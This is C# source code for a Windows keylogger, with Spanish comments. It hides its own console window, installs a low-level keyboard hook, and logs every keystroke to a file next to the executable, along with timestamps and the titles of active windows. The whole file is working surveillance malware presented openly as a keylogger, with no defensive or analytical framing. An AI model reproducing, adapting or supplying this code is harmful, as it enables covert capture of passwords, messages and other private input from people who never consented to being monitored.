using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    private static StreamWriter logWriter;
    private static string lastWindowTitle = "";

    [STAThread]
    static void Main()
    {
        // Oculta la consola
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Crear ruta del log en el mismo directorio
        string exePath = Assembly.GetExecutingAssembly().Location;
        string exeDir = Path.GetDirectoryName(exePath);
        string logPath = Path.Combine(exeDir, "log.txt");

        // Abrir archivo de log
        logWriter = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
        {
            AutoFlush = true
        };

        // Instalar hook
        _hookID = SetHook(_proc);

        // Bucle de mensajes
        Application.Run();

        // Al cerrar
        UnhookWindowsHookEx(_hookID);
        logWriter.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            // Obtener la ventana activa
            IntPtr hWnd = GetForegroundWindow();
            StringBuilder buffer = new StringBuilder(256);
            GetWindowText(hWnd, buffer, 256);
            string currentWindowTitle = buffer.ToString();

            // Si cambió la ventana
            if (currentWindowTitle != lastWindowTitle)
            {
                lastWindowTitle = currentWindowTitle;
                logWriter.WriteLine();
                logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
            }

            logWriter.WriteLine("  " + key);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // DLL imports
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    private const int SW_HIDE = 0;
}
